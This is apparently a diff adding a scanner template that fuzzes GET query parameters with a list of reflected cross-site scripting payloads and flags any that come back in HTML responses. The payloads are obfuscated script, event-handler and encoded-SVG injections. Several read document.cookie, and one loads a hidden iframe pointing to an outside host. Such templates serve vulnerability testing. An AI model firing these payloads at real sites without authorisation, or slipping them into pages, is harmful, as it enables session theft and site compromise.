@@ -1,0 +1,55 @@
+id: reflected-xss2
+
+info:
+  name: Reflected Cross Site Scripting
+  author: github.com/freelancermijan
+  severity: medium
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<svg/onload=location=location.hash.substr(1)>#javascript:alert(1)"
+        - '><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--'
+        - "1%22onfocus=%27alert%28document.cookie%29%27%20autofocus="
+        - "1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus="
+        - '"><img src=x onerror=alert("xss!")>.pdf'
+        - "%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E"
+        - "<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>"
+        - "%3Cdiv%20id%3D%22load%22%3E%3C%2Fdiv%3E%3Cscript%3Evar%20i%20%3D%20document.createElement%28%27iframe%27%29%3B%20i.style.display%20%3D%20%27none%27%3B%20i.onload%20%3D%20function%28%29%20%7B%20i.contentWindow.location.href%20%3D%20%27%2F%2Fxss.today%27%3B%20%7D%3B%20document.getElementById%28%27load%27%29.appendChild%28i%29%3B%3C%2Fscript%3E"
+        - "<sCrIpT>(function(){var a=[97,108,101,114,116];var"
+        - "b=String.fromCharCode.apply(null,a);var c=[88,115,112,108,111,105,116];var d=String.fromCharCode.apply(null,c);window[b](d);})()</sCrIpT>"
+        - "<svg onload=(function(){let arr=[41,49,40,116,114,101,108,97].reverse().map(e=>String.fromCharCode(e));let func=new Function(...arr);func();})()>"
+        - '<svg onload="alert(1)"></svg>'
+        - "<select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>"
+        - '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>'
+        - '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>'
+        - "<math><x xlink:href=javascript:confirm`1`>click"
+        - "<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/"
+        - "<svg onload=alert&#0000000040document.cookie)>"
+        - "JavaScript://%250Aalert?.(1)//"
+        - "</Title/</Style/</Script/</textArea/</iFrame/</noScript>"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
